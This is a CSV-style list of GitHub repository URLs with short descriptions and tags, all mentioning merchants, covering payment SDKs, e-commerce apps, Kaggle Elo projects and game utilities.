0,https://github.com/VitexSoftware/VendorZone.git,FlexiBee merchant administration tool,"flexibee,easephp,ecommerce-application",1
0,https://github.com/webnalist/WebnalistFrontend.git,WebnalistFrontend Merchant Library,,1
0,https://github.com/yosriady/merchant.git,Practice Merchant Rails application,,1
0,https://github.com/openbiyong/merchant-h5-demo.git,biyong merchant h5 demo,,1
0,https://github.com/jayvzolazo/ci-merchant-extended.git,Modified CI-Merchant Library,,1
0,https://github.com/Atome-FE/AtomeMerchantDemo-iOS.git,Atome Merchant iOS Demo ,,1
0,https://github.com/bihanipaper/Shree-Bihani-Paper-Syndicate.git,Wholesale Paper Merchant,,1
0,https://github.com/prasom/tmb_merchant.git,tmb_merchant demo app,,1
0,https://github.com/tonygustafsson/merchants-endeavor.git,"{""[POC] Merchant's Endeavor""}",,1
0,https://github.com/jaganmohan/EloMerchant.git,Elo Merchant Category Recommendation,,1
0,https://github.com/Lambda-School-Labs/merchant-marketplace-fe.git,Merchant Marketplace FE,,1
0,https://github.com/i-gera/check-for-merchant.git,check-for-merchant,,1
0,https://github.com/harrystech/merchant_e_solutions.git,Merchant e-Solutions Reports,,1
0,https://github.com/maman/rewardly-merchant.git,Rewardly Merchant web application,,1
0,https://github.com/crystoline/merchant-reg-portal.git,Merchant Registration Portal,,1
0,https://github.com/FreddiefromStreetFed/streetfedpro_app.git,Streetfed Merchant Only App,,1
0,https://github.com/consensusRealityIO/RSMS.git,Real Simple Merchant System,,1
0,https://github.com/sununvl/BillManager.git,Bill manager for merchant,,1
0,https://github.com/pegkeloyalty/merchant-api.git,Pegke Loyalty Merchant API,"loyalty,api-documentation,s",1
0,https://github.com/bheyde1/MailChimp-Newsletter-Sign-Up.git,Miva Merchant Component Module,,1
0,https://github.com/beemerwt/Merchanteer.git,Albion Online Merchant Utility,,1
0,https://github.com/xiajian/omniauth-wish-oauth2.git,wish merchant oauth2 api gem,,1
0,https://github.com/mivaecommerce/template-language.git,Miva Merchant Template Language Documentation,,1
0,https://github.com/bcpearce/merchant.git,Merchant tutorial from Jumpstart Labs,,1
0,https://github.com/Bitcoin-com/Pay.bitcoin.com.git,Documentation for BIP70 merchant server,,1
0,https://github.com/samuelkubai/express-checkout-vendor-scripts.git,The mula merchant JS script ,,1
0,https://github.com/mmsergeev1/Tinkoff_MAPI_Integration.git,Tinkoff Merchant API python integration,,1
0,https://github.com/jsdecena/cashu.git,CashU merchant module for prestashop,,1
0,https://github.com/iambotHQ/google-merchant-client.git,Google Merchant RSS feeds client,,1
0,https://github.com/evstropov/django-webmoney-merchant.git,WebMoney Merchant Interface for Django.,,1
0,https://github.com/cocodot/activemerchant.git,active merchant w/ cocodot patches,,1
0,https://github.com/Masterpass/MerchantOnboardingSDK-PHP.git,Masterpass Merchant Onboarding SDK - PHP,,1
0,https://github.com/TGaston/Kaggle-Elo-Merchant.git,kaggle Elo Merchant 3.07,,1
0,https://github.com/Peppinux/dero-merchant.git,Source code of DERO Merchant,,1
0,https://github.com/selfup/avorion.git,Merchant Goods Helper for Avorion,,1
0,https://github.com/klix-app/merchant-api-php.git,Klix merchant API PHP SDK,"klix,php,library,sdk,checkout,php-sdk,klix-checkout",1
0,https://github.com/PrestaShopCorp/merchantware.git,Support for Merchant Warehouse payments,"prestashop-module,payment-module,obsolete",1
0,https://github.com/jenglert/gmerchtracker.git,A tracker for Google Merchant,,1
0,https://github.com/pperreiah/project-bitcoin.git,Project #1: Bitcoin merchant locator,,1
0,https://github.com/haoHu/merchant.git,merchant managment system ui prototype,,1
0,https://github.com/guodongyangwen/QFLoginSDKDemo.git,login service for QFPay merchant,,1
0,https://github.com/lanjie911/merchantload.git,a super load merchant facedoor,,1
0,https://github.com/magecredit/magento-store-credit-rest-api.git,Magento store credit REST API specification and examples for merchants using Magecredit.,,1
0,https://github.com/saleemshafi/magento-cause-campaign-extension.git,Magento extension to allow merchants to run campaigns to raise funds for specific causes.,,1
0,https://github.com/mtruon/shopify-mobile-dev-s19.git,An iOS challenge application which displays information in a table for merchants ,,1
0,https://github.com/DraconicLogic/PackingList_Webapp.git,Tool to help Rag Merchants keep a tally of the bales when loading a container,,1
0,https://github.com/tigo4/Java-Spring-app-purchase-best-price.git,Project to get quotes from merchants in threads and buy products at the best price.,,1
0,https://github.com/Pasilobus/shopify-scripts-examples.git,Some examples to get you started on Shopify Scripts available to Shopify Plus merchants.,,1
0,https://github.com/Team-WhatsUpApp/WhatUp.git,An e-commerce marketplace application that will connect subscribers with local merchants,,1
0,https://github.com/IvanGTrendafilov/Worldpay-offer-service.git,Spring Boot Rest API with embedded Database for creating offers by merchants,,1
0,https://github.com/simtabi/shortbill.git,A collection of paybill and shortcode numbers for various payments merchants in Kenya,,1
0,https://github.com/hoythan/MugglePayForWooCommerce.git,MugglePay is a one-stop payment solution for merchants with an online payment need.,,1
0,https://github.com/KCnick/G-Connect.git,An online platform that connects merchants and buyers and offers an effective logistics solution for them,,1
0,https://github.com/ggabrovski/epaybg-bundle.git,OtobulEpaybgBundle is symfony bundle to help working with ePay.bg communication package for merchants.,,1
0,https://github.com/VyunSergey/census-brands-clusters.git,"Data analysis on Census data frame: clustering data, creating brands out of merchants and terminal",,1
0,https://github.com/RTB-Project/Auctioneer.git,An mediator between merchants and buyers. Distributes the goods through an auction to buyers,,1
0,https://github.com/jchillerup/basset-tracking.git,Javascript snippet for merchants to include on their checkout web page,,1
0,https://github.com/carolus10benny/midtrans-java-client.git,This plugin is used to meet the needs of midtrans merchants who use java programming technology.,,1
0,https://github.com/Conceptx/ecocash-bills-app.git,"mobile app that allows you to make pay merchants, bills, and buy electricity tokens easy",,1
0,https://github.com/ImgBotApp/truesale.git,Truesale helps merchants with special brands reachout and sell more through influencers.,,1
0,https://github.com/robertcorponoi/shopkeepr.git,Shopkeepr makes it easy for you to add merchants/stores/shopkeepers to your JavaScript game.,,1
0,https://github.com/tonymelek/communityFete.git,"Simple application for both merchants and clients, with live order tracker and in-app payments","react,socket-io,merchandise,jwt-token,bcryptjs",1
0,https://github.com/EinBaum/VendorAutoBuy.git,WoW 1.12.1 Addon: Auto buy limited items from merchants,wow-addon,1
0,https://github.com/Mthec/DeliveryContracts.git,Special contracts for Wurm Unlimited to facilitate selling bulk items on merchants.,,1
0,https://github.com/Developers-codz/FarmMartProject.git,"site for selling farm product to merchants ,dealers and to homes",,1
0,https://github.com/btgangsta/rtx3000-rx6000-zen3-links.git,"Contains links to Australian merchants selling RTX 3000, RX 6000 and Zen 3 CPUs",,1
0,https://github.com/eShoppers/E-Shoppers.git,"E-Shoppers is an online shopping, gives opportunity for merchants to sell their product online",,1
0,https://github.com/payspec/payspec-bot.git,NodeJS bot that assists merchants with creating invoices and retrieving invoice data from the Ethereum blockchain,,1
0,https://github.com/rynecheow/Encore.git,"[Sandbox] A seamless, lightweight online ticketing system platform for ticket merchants and online customers.",,1
0,https://github.com/M1ke/nmi.git,An API implementation for the NMI (Network Merchants International) payment gateway,,1
0,https://github.com/imgarylai/rails_active_merchant_pay2go.git,Example Rails app with active_merchant_pay2go,,1
0,https://github.com/ericliam/merchant_tag.git,this text contains merchant tag testing results,,1
0,https://github.com/CASAN-TH/justq-merchant-app.git,Just Q for merchant mobile application,,1
0,https://github.com/sandipray63in/MerchantsGuideToGalaxy.git,"{""Merchant's Guide to Galaxy Solution""}",,1
0,https://github.com/Peppinux/dero-merchant-go-sdk.git,Go SDK for DERO Merchant REST API,,1
0,https://github.com/mivaecommerce/api-sdk-csharp.git,Miva Merchant JSON API SDK for C#,,1
0,https://github.com/Shoppo/merchant-restful-api-docs.git,Documentation & Demo of Shoppo merchant restful API,,1
0,https://github.com/mcash/php-sdk.git,PHP SDK for mCASH Merchant API,,1
0,https://github.com/Obsidian-StudiosInc/jtsys.git,Java library interface to Tsys merchant processor,,1
0,https://github.com/channelengine/merchant-api-client-python.git,ChannelEngine Merchant API Client for Python,,1
0,https://github.com/Shoppo/merchant-restful-api-docs.git,Documentation & Demo of Shoppo merchant restful API,,1
0,https://github.com/Peppinux/dero-merchant-go-sdk.git,Go SDK for DERO Merchant REST API,,1
0,https://github.com/mivaecommerce/api-sdk-csharp.git,Miva Merchant JSON API SDK for C#,,1
0,https://github.com/PawnPaymentSolutions/gateway_adapter.git,The official Pawn-Pay Merchant Gateway Adapter,,1
0,https://github.com/ManojGolkonda/Prtintf-The-Online-Printing-Service.git,"The Online Printing Service provide the interaction between Customers and Merchants, where Customer requests for a service and Merchant provides a service.",,1
0,https://github.com/SideStudios/paypal_php_sdk.git,Simple PayPal Merchant API SDK for PHP,,1
0,https://github.com/RazerMS/rms-mobile-xdk-unity3d.git,Razer Merchant Services mobile payment for Unity3D,,1
0,https://github.com/n-genesis/OpenCart-Merchant-e-Solutions.git,Merchant e-Solutions module for OpenCart,,1
0,https://github.com/Mastercard/mastercard-merchant-performance-php.git,https://packagist.org/packages/mastercard/merchant-performance,,1
0,https://github.com/cubits/cubits-ruby.git,Ruby client for Cubits Merchant API,,1
0,https://github.com/aberba/hubtel.git,An unofficial Hubtel Merchant API for D,,1
0,https://github.com/authoritydmc/payTap_Merchant.git,PAYTAP merchant app (NFC support Added ),,1
0,https://github.com/andy-cywang/account-manager.git,A web app backend manages merchant accounts,,1
0,https://github.com/salchy-tera/tera-npc-summoner.git,Summon any npc/merchant from anywhere,"tera-proxy,tera,tera-toolbox,tera-mods,tera-online",1
0,https://github.com/marciojustino/galaxy-merchant.git,"{""Merchant's Guide to the Galaxy""}",,1
0,https://github.com/10XPhilippines/flutter_merchants.git,üì± Merchant business application built with Flutter,"dart,flutter,pub,android",1
0,https://github.com/moolah-io/php-client.git,PHP library for the Moolah Merchant API.,,1
0,https://github.com/broughten/blingnation_signup.git,Merchant Signup app for Bling Nation,,1
0,https://github.com/lvpeng/weapp_doumi.git,this is a doumi merchant weapp demo ,,1
0,https://github.com/paytrail/merchant-api.git,Library for using Paytrail Merchant API services,"paytrail,merchant-api,php",1
0,https://github.com/SadakatulShakil/LaalSobuj_Merchant.git,A dashboard for merchant from laalsobuj.com,,1
0,https://github.com/mobilabsolutions/stash-sdk-merchant-backend.git,Merchant backend for Stash! SDK Demo App,,1
0,https://github.com/jonathanlimsc/Super5-Money2020.git,The next revolutionary bitcoin merchant aggregator,,1
0,https://github.com/AndrewUshchenko/WebMoney-CI-Library.git,WebMoney(WM) merchant for php framework CodeIgniter,,1
0,https://github.com/channelengine/merchant-api-client-csharp.git,ChannelEngine Merchant API Client for .NET,,1
0,https://github.com/rolandddiaz/lordsmerchant.git,Lords Merchant Company Website Source Codes,,1
0,https://github.com/bulckens/merchant-v2-callback-verification-ruby.git,Payconiq merchant v2 callback verification with Ruby.,"payconiq,signature,validation",1
0,https://github.com/paparateam/merchantApiClient-dotnet.git,Merchant client project nuget for dotnet,,1
0,https://github.com/JioMoney-Integration/JioMoney_Android_SDK.git,JioMoney Android SDK For Merchant Integration,,1
0,https://github.com/Payngolinky/shop.git,Payngolinky front-end for merchant and customer,,1
0,https://github.com/replica-merchant-account/replica-merchant-account.git,Providing high risk merchant accounts integration guide to work with any software within replica merchant accounts industry,,1
0,https://github.com/nonseodion/SwapPay.git,A smart contract payment gateway that swaps ETH and ERC20 tokens on exchanges and pays merchants in their preferred stablecoin.,,1
0,https://github.com/tafa/invoice-matcher.git,"Merchants {post,withdraw} invoices, customers {search}. Intended for mobile Bitcoin payments without QR codes or near-field wireless.",,1
0,https://github.com/wl-sips/sips-paypage-json-php-migration-from-sips-1.0.git,code samples to integrate Sips Paypage JSON in PHP for merchants migrating from WL Sips 1.0,,1
0,https://github.com/neerajdotname/active_merchant_ext.git,active_merchant_ext is an active_merchant extension that helps with testing if you are using `AuthorizeNetCimGateway` gateway.,,1
0,https://github.com/oladipo/Prestashop-WebPay-Module.git,A payment module for prestashop for interswitch webpay. Setup a merchant account [at] http://www.merchant.microzahlen.com,,1
0,https://github.com/e1337us3r/ecart.git,E-commerce system with LAMP stack backend and 2 end-points: Java application(for merchants) and Website (for shoppers).,,1
0,https://github.com/jdjkelly/TimedSales.git,Timed Sales is Shopify application that gives merchants the ability to set sale start and end times for their products.,,1
0,https://github.com/wl-sips/sips-paypage-post-php-migration-from-sips-1.0.git,code samples to integrate Sips Paypage POST in PHP for merchants migrating from WL Sips 1.0,,1
0,https://github.com/hereiskeith/BizMSM-ecommerce-App.git,An e-commerce mobile app for local merchants & customers and make online shopping safer and easier:D,,1
0,https://github.com/victordarras/SilveryWarrior.git,"[WIP] 2D MMORPG, fight mobs, gain experience, deal with merchants and compare your big stuff with your friend.",,1
0,https://github.com/fraudlabspro/prestashop.git,Fraud prevention module for PrestaShop platfom. It help merchants to minimize the payment fraud and therefore improve the revenues.,"fraud-prevention,payment-fraud,prestashop,fraudlabspro,fraud-detection,fraud-protection,prestashop-module,prestashop-addon",1
0,https://github.com/jon-chua/PromoGo.git,PromoGo allows Small Business Merchants to promote their stores through targeted promotions and an addictive promotion capture process.,,1
0,https://github.com/netresearch/gls-shipping-m2.git,This extension enables merchants to request and cancel shipping labels for incoming orders via the GLS Web APIs.,,1
0,https://github.com/Biotruss/commerce_app_rails_project.git,"This is my Rails project, Commerce App. This app allows guests to browse and make requests for products from merchants.",,1
0,https://github.com/matholroyd/bitcoin-pos.git,"Simple, 1-page Bitcoin Point-Of-Sale so merchants an quickly start accepting one-off bitcoin purchases.",,1
0,https://github.com/colleowino/merchant.git,using rails to create a shop app with merchant accounts,"rails,ruby",1
0,https://github.com/cea2k/active_merchant_transbank.git,Active Merchant integration with Transbank payment service Webpay,,1
0,https://github.com/oshalygin/mdjs-io.git,Merchant Dashboard built in React and Node.js,,1
0,https://github.com/aniwange33/cash-money-management.git,manage cash transaction between a merchant and customer,,1
0,https://github.com/mattijsbliek/mollie-dashboard-import-sorter.git,Fix import sorting order for the Mollie merchant dashboard,,1
0,https://github.com/annaprotasio/Merchant_et_al_2020.git,Supporting material for publication Merchant et al 2020,,1
0,https://github.com/mallerie/Mock-Subaru-Page.git,Online merchant page re-created to pixel perfection.,,1
0,https://github.com/Vantiv/payfac-mp-sdk-dotnet.git,"{""Worldpay's .NET SDK for PayFac Merchant Provisioner API""}","sdk,worldpay,merchant,provisioner,payfac",1
0,https://github.com/nerdylife/electrum-merchant-docker.git,"Docker with electrum daemon, electrum-merchant is installed",,1
0,https://github.com/karmatta/Merchant-Name-Decoder-from-Transaction-String.git,Encoder-decoder to decode merchant name from transaction strings,,1
0,https://github.com/guchio3/kaggle-elo.git,the kaggle repo for `Elo Merchant Category Recommendation`,,1
0,https://github.com/prime-space/admin.git,"–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å –¥–ª—è –ø—Ä–æ–µ–∫—Ç–æ–≤ old-marketplace, new-marketplace –∏ merchant.",,1
0,https://github.com/krithika93/shopping_cart_php_with_merchant_page.git,A fully updated shopping cart with merchant pages ,,1
0,https://github.com/Codzart/RiMo.git,Ripple Mobile Merchant App - Texas Bitcoin Conference 2014 Hackathon,,1
0,https://github.com/RazerMS/rms-mobile-xdk-cocoapods.git,Razer Merchant Services mobile payment for iOS (Cocoapods Framework),,1
0,https://github.com/torpkev/MerchantPriceSetter.git,Plugin to override the buy price of merchant items,,1
0,https://github.com/mallerie/Mock-Subaru-Page.git,Online merchant page re-created to pixel perfection.,,1
0,https://github.com/Vantiv/payfac-mp-sdk-dotnet.git,"{""Worldpay's .NET SDK for PayFac Merchant Provisioner API""}","sdk,worldpay,merchant,provisioner,payfac",1
0,https://github.com/nerdylife/electrum-merchant-docker.git,"Docker with electrum daemon, electrum-merchant is installed",,1
0,https://github.com/guchio3/kaggle-elo.git,the kaggle repo for `Elo Merchant Category Recommendation`,,1
0,https://github.com/karmatta/Merchant-Name-Decoder-from-Transaction-String.git,Encoder-decoder to decode merchant name from transaction strings,,1
0,https://github.com/prime-space/admin.git,"–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å –¥–ª—è –ø—Ä–æ–µ–∫—Ç–æ–≤ old-marketplace, new-marketplace –∏ merchant.",,1
0,https://github.com/psp-polska/active-merchant-with-psp-polska-integration-demo-app.git,"{""Demo app for psp polska's active merchant integration""}",,1
0,https://github.com/thiagomeireless/ame-merchant-sdk.git,SDK para comunica√ß√£o com a Ame Merchant API,,1
0,https://github.com/arlyon/runemerchant.git,An API and web app for runescape merchanting.,"django,runescape,api",1
0,https://github.com/felipecoder/googlereviewsmerchant.git,Plugin for Integration Woocommerce to Google Reviews Merchant Shopping,,1
0,https://github.com/NelsonMcKey/PUNCH.git,Merchant/Customer loyalty platform - Connect with your customers,,1
0,https://github.com/neerajkumar/active_merchant.git,extended active merchant plugin to support beanstream APIs,,1
0,https://github.com/bulckens/inpay.git,A ruby gem for the inpay.com merchant API.,,1
0,https://github.com/ranjankumar03/galaxy-merchant-simulator.git,"{""Problem Snippets: Merchant's Guide to the Galaxy""}",,1
0,https://github.com/r-terada/elo-merchant-category-recommendation.git,https://www.kaggle.com/c/elo-merchant-category-recommendation,,1
0,https://github.com/IanVaughan/mgtlg.git,"{""Merchant's Guide to the Galaxy ruby test""}",,1
0,https://github.com/cubesystems/active_merchant_every_pay.git,"EveryPay gateway for Active Merchant (Swedbank, SEB and LHV)",,1
0,https://github.com/magento-devdocs/flare-to-jekyll.git,Flare to Jekyll converter for the Magento merchant documentation,,1
0,https://github.com/networknt/taiji-blockchain.git,light block chain end user and merchant components,,1
0,https://github.com/evl/Repair.git,Automatically repair equipment and inventory when talking to a merchant,,1
0,https://github.com/rdvdijk/active_merchant_ideal_multicert.git,A patch for active_merchant_ideal to support multiple certificates.,,1
0,https://github.com/Vantiv/payfac-mp-sdk-python.git,"{""Worldpay's Python SDK for PayFac Merchant Provisioner API""}","sdk,worldpay,merchant,provisioner,payfac",1
0,https://github.com/Navbryce/Interstellar-Merchant-Angular.git,Angular Web App version of Interstellar Merchant Game,,1
0,https://github.com/crystalZhang69164/MerchantRegistration.git,merchant registration for the food delivery project web api ,,1
0,https://github.com/amplogik/SpendItScanner.git,Merchant and Consumer Scanner App for SpendIt.com Deals,,1
0,https://github.com/ripple-unmaintained/merchant-magento.git,Ripple merchant plugin for Magento shopping cart system.,,1
0,https://github.com/erwald/kaggle-competition-elo-loyalty-prediction.git,https://www.kaggle.com/c/elo-merchant-category-recommendation,,1
0,https://github.com/dscataglini/ActiveMerchantRecurringPayments.git,Support for recurring payments from within active merchant,,1
0,https://github.com/erwald/kaggle-competition-elo-loyalty-prediction.git,https://www.kaggle.com/c/elo-merchant-category-recommendation,,1
0,https://github.com/jeremymarc/active_payment.git,"Active Payment is a Rails engine to handle effortless transactions. It works with https://github.com/activemerchant/active_merchant, and support Paypal Express Checkout and Paypal Adaptive Payment.",,1
0,https://github.com/dscataglini/ActiveMerchantRecurringPayments.git,Support for recurring payments from within active merchant,,1
0,https://github.com/mandus/mcashmapiclient.git,"Client for the mCash Merchant-api, written in common lisp. ",,1
0,https://github.com/iamxiaoma/veasymall_merchant_antd.git,one mall merchant system base on ant design vue.,,1
0,https://github.com/subzero10/ecwid-revolut-merchant-payment.git,Ecwid Payment Method integration with Revolut Merchant API,,1
0,https://github.com/codearachnid/gravityforms-cardconnect-payment-gateway.git,CardConnect merchant gateway integration for Gravity Forms payment gateway.,,1
0,https://github.com/bibekm/elo-merchant-category-recommendation.git,Project files for ELO Merchant Category Recommendation project,,1
0,https://github.com/Kein1945/LumiRoMerchantsAndroid.git,Merchant monitoring for LumiRo.net Ragnarok online server,,1
0,https://github.com/RazerMS/rms-mobile-xdk-cocoapods-EOL-.git,Razer Merchant Services mobile payment for iOS (Cocoapods Framework),,1
0,https://github.com/yassineAlouini/elo_merchant_category_recommendation.git,Code for the Elo Merchant Category Recommendation Kaggle challenge,"rmse,machine-learning,tabular-data,kaggle,regression",1
0,https://github.com/RazerMS/rms-mobile-xdk-ios.git,Razer Merchant Services mobile payment for iOS (Xcode Framework),,1
0,https://github.com/daftspunk/ls-module-merchantwarrior.git,Adds Merchant Warrior payment methods to your Lemonstand store,,1
0,https://github.com/FinalBitSW/fb_googleshopping.git,"Export your products to Google Merchant Center, easily.",,1
0,https://github.com/connect2nelson/MerchantGuideToGalaxy.git,An attempt to solve the Merchant Guide to galaxy problem,,1
0,https://github.com/ankitdaf/phonepe_api_examples.git,This repository contains code examples for merchant integrations with PhonePe,,1
0,https://github.com/PriceRunner/API-client.git,C# client for use against PriceRunner Merchant API,,1
0,https://github.com/adimoraret/MerchantDashboard.git,"Merchant dashboard built on React, Redux, Express, etc",,1
0,https://github.com/cgaoumd/Kaggle--Elo_Loyalty_Score.git,My repository for the kaggle competition Elo Merchant Category Recommendation,,1
0,https://github.com/lokeshmeesala/Fraudulent-Merchant-classification.git,Fraudulent Merchant classification for an e-commerce client.,,1
0,https://github.com/dhananjaychaudhari26/Elo_Merchant.git,"Case Study: Elo Merchant Category Recommendation , Help understand customer loyalty",,1
0,https://github.com/gocoderslab/go_merchant.git,"Go Merchant is a multi-gateway payment processing library for Golang. In other words, it is a Golang alternative to Active Merchant for Ruby, Omnipay and Aktive Merchant for PHP payment gateway aggregation libraries.",,1
0,https://github.com/thangasblockchain/Decentralized-Merchant-Risk-Sharing.git,"Merchant Onboarding includes acquirer bank and Payment gateway certifications. by decentralise Merchant risk sharing with the help of DLP, we can eliminate the Merchant frauds (Bust Out Fraud and Identity Swap)",,1
0,https://github.com/Cart2Cart/Magento-to-OpenCart-Migration-Module.git,"Cart2Cart: Magento to OpenCart Migration Module helps to set up the connection between Magento and OpenCart platforms in order to perform data migration. It offers a possibility to implement data interaction between two shopping carts. Merchants will be able to move all products, customers, orders with a corresponding information in a few simple steps.",,1
0,https://github.com/Isabelle-123/salt-graduation-project.git,"{""My final graduation project @saltsthlm together with my team's client Way. A dashboard for connected merchants to get an overview of their Way order flow. https://way-merchant-dashboard.web.app/""}",,1
0,https://github.com/borao/visa-hackathon.git,A multisided platform that helps consumers and small merchants manage loyalty programs and drive transactions by providing social incentives to consumers.,"payments,merchant,django,django-rest-framework,swift",1
0,https://github.com/shirazksiddiqi/online-shopping-model.git,To predict if the customer will buy from a franchise merchant (e.g. BestBuy/Walmart etc.) or a local merchant based on purchasing preferences.,,1
0,https://github.com/tiero/bpay-mobile-app.git,Mobile app for merchants and customers to do payments in store without Credit or Debit Card. Built during Hyperledger Hackaton 2016 in Amsterdam,,1
0,https://github.com/Immolare/simple-linked-products.git,"{""A simple module which allow Prestashop's merchants to link a physical product to a virtual one (or the inverse side)""}",,1
0,https://github.com/wigalgh/redde-java-sdk.git,"A Java SDK built around the Redde REST API that allows merchants to receive, send, check transaction status, and perform lots of payment transactions.","redde,wigal,wigalpayments,payment-gateway,payment-integration,payment-api,payment-platform,java-sdk,receivemoney,sendmoney,payment-transactions,money",1
0,https://github.com/Mazgis47/MobilePay.git,MobilePay is a mobile payments solution which can be used to send money to your friends or buy goods from merchants,,1
0,https://github.com/wigalgh/redde-nodejs-sdk.git,"A NODEJS SDK built around the Redde REST API that allows merchants to receive, send, check transaction status, and perform lots of payment transactions.",,1
0,https://github.com/PTNUSASATUINTIARTHA-DOKU/API-DOKU-Merchant-Hosted.git,"Merchant Hosted is a service where data input is native to the merchant‚Äôs website, without having to redirect to a DOKU page. ",,1
0,https://github.com/antonowano/qiwi-topup.git,Top-Up API is intended for merchants or payment service providers (PSP) who need to send money to QIWI Wallet users.,,1
0,https://github.com/ClicShoppingV3Community/modules_hooks_checkout_safe_shop.git,"Safe.Shop is the global trustmark for online shopping, helping consumers shop online with confidence and merchants to grow both at home and internationally","hooks,marketing,certificate,reviews",1
0,https://github.com/PhocaCz/PhocaCartFeedGoogleMerchantPlugin.git,Phoca Cart Feed - Google Merchant plugin - XML feed plugin for Phoca Cart component. Extends XML Feed with new Google Merchant elements.,,1
0,https://github.com/Rubanrubi/Coinpayments-Using-Laravel.git,"CoinPayments is a payment processor that allows merchants to accept Bitcoin and hundreds of altcoins in their store through easy to use plugins, APIs and POS interfaces",,1
0,https://github.com/zaycodes/Interswitch-HostedFields-Payment-Integration-AfricaHacks.git,"Integrating to Interswitch Hosted Fields for payments, an SDK designed for non PCI DSS(Payment Card Industry Data Security Standard) complaint merchants",,1
0,https://github.com/ElvisLee0725/super-coupon-pocket-lfz.git,A web application that users can keep track of all coupons they have received easily so they will never miss free stuff or discounts from their favorite merchants. ,,1
0,https://github.com/abahernest/WealthlineMerchants.git,"Wealthline Merchants is an affiliation of RAGP; an African based company which handles online payment of value added services,bills and purchasing airtime.",,1
0,https://github.com/GlobalPay/credit-card-processing.git,"GlobalPay offers credit card processing for all types of merchants. Wireless / mobile credit card processing through smartphones or tablet (Apple, Android, & BlackBerry), retail solutions and a virtual payment gateway with recurring billing option for e-commerce merchants. Sign up today to receive your FREE credit card reader.  www.GlobalPay.me",,1
0,https://github.com/roc41d/IMS_Soft400.git,IMS_Soft400 is an online inventory management system that helps merchant to manage their good online,,1
0,https://github.com/sideshowcoder/active_merchant-paypal-bogus-gateway.git,Extracted from a PR agains ActiveMerchant https://github.com/activemerchant/active_merchant/pull/424,,1
0,https://github.com/kartuku/sandbox_client_php.git,"IPG Sandbox Client for merchant integration test, sample codes written in PHP",,1
0,https://github.com/gevans/koi.git,"{""Painless payment processing for Kohana. Based on Shopify's Active Merchant.""}",,1
0,https://github.com/Brandon0/Miva_Password.git,Generate and verify Miva Merchant 5 PR8-7 compatible password hashes using PHP.,,1
0,https://github.com/charliepark/minimum_recurring_payments.git,"Thoughts, and maybe code, on getting recurring payments working with Braintree and Active Merchant.",,1
0,https://github.com/Autumn-Martin/rails_engine.git,"A RESTful JSON API for merchant, customer, item, invoice, & transaction data.",,1
0,https://github.com/BIZ4Africa/ofxstatement-cd-tmb.git,"{""This is the plugin for ofxstatement that implements Congolese Trust Merchant Bank's csv to ofx""}",,1
0,https://github.com/Sknikumbha/Merchant_Enrolment_Api.git,"Web Api for merchant Enrolment developed in Visual Studio 2013, C#",,1
0,https://github.com/tokenio/merchant-proxy.git,"Proxy for Merchant Checkout scenario, with a simple grpc/http interface",,1
0,https://github.com/aaronkuchma/CaVirtExSupportForEcwid.git,Authorize.net emulation to support CaVirtEx merchant API / bitcoin payments on Ecwid sites.,,1
0,https://github.com/affiliateprocessing/woo-commerce-mx-merchant.git,This is a Word Press Processor that integrates with the MX Merchant payment gatemway,,1
0,https://github.com/a7ul/swish-via-sound-pwa.git,A POC on how to make swish payment on iZettle Merchant device using Sound!!!,,1
0,https://github.com/prashantgarbuja/Email-Converted-PDF.git,A simple project to convert details into pdf and send email to respective merchant.,,1
0,https://github.com/LibraM9/kaggle_elo.git,2019 kaggle Elo Merchant Category RecommendationÔºàÁî®Êà∑Êé®ËçêËØÑ‰ª∑Ôºâ Èì∂Áâå,,1
0,https://github.com/SBozhko/tw-test-task.git,"This project represents a solution to the ""Problem Three: Merchant\'s Guide to the Galaxy""",,1
0,https://github.com/AngelOnFira/Miracle-Merchant-AI.git,An AI for the mobile game Miracle Merchant. Created for COMP 4106,,1
0,https://github.com/louislung/EloMerchantCategoryRecommendation.git,For the Kaggle competition https://www.kaggle.com/c/elo-merchant-category-recommendation/data,,1
0,https://github.com/varyonic/activemerchant-argus.git,Active Merchant extension to support Inovio payment gateway (f.k.a. Argus),activemerchant,1
0,https://github.com/benitech/UtilityTokenOffering.git,WNTU Utility Token for payment of Merchant Fees on Want Marketplaces ecosystem,,1
0,https://github.com/merchantsedition/coreupdater.git,"{""This Merchant's Edition module brings the tools for keeping your shop installation up to date.""}",,1
0,https://github.com/chaoyee/active_merchant_focas.git,Active merchant library for  Focas payment system (Ë≤°ÈáëË≥áË®ä),,1
0,https://github.com/AdvaiyaLabs/Miva-Merchant-with-Nexmo-SMS.git,An app to send SMS to keep you updated about your Miva Merchant orders,,1
0,https://github.com/Wang-ErHu/imss.git,Êô∫ËÉΩÂïÜÊà∑ÊúçÂä°Á≥ªÁªüÔºàIntelligent merchant service systemÔºâ,,1
0,https://github.com/fatzebra/ActiveMerchant-FatZebra.git,"Fat Zebra support for Active Merchant, extracted into an add-on gem",,1
0,https://github.com/SerzhYevtushenko/amazon-mws-merchant-fulfillment.git,Merchant Fulfillment API Section Client Library - PHP - Version 2015-06-01,,1
0,https://github.com/ai-zml/Seafarers-PPE-Detection.git,"{""seafarers' personal protective equipments detection aboard merchant marine ships, such as helmet, goggle, work outfit etc.""}",,1
0,https://github.com/marcust/Google-Merchant-Module-for-ROME.git,A simple Google Merchant Module for the Java RSS/ATOM Feed Library ROME,,1
0,https://github.com/bornofthemind/SimpleCart-2.2.git,A simple shopping cart made in Vanilla JavaScript that easily integrates with your current website & Merchant,,1
0,https://github.com/ninjaconcept/active_merchant_ogone_example.git,Example application for using active_merchant together with payment gateway ogone,,1
0,https://github.com/B-Pratik/Merchants-guide-to-galaxy-Node.js-Javascript.git,"{""Node.js/Javascript implementation of classic 'Merchant's guide to galaxy' problem""}",,1
0,https://github.com/bartels/pyqbms.git,Python Bindings for Quick Books Merchant Services ( forked from http://code.google.com/p/pyqbms/ ),,1
0,https://github.com/atomixdesign/nodepay.git,"A payment gateway abstraction layer written in Typescript, taking inspiration from Omnipay & Active Merchant",,1
0,https://github.com/varunity/plugnpay.git,Drupal module to validate Jamaican merchant/bank cards through Plug n Pay gateway,,1
0,https://github.com/jinmatt/galaxy-trader.git,"{""Merchant's Guide to The Galaxy - a Node.js implementation to usual interview coding challenge ""}",,1
0,https://github.com/happinesea/rws-lib.git,rws-lib is a groovy(java) library for RMS(Rakuten Merchant Server) WEB SERVICE.,,1
0,https://github.com/RowlandOti/E-CommerceApp-Merchant.git,üìü A merchant side e-commerce application for managing products for sale,"firestore-database,firestore-collection,ecommerce,merchant-dashboard",1
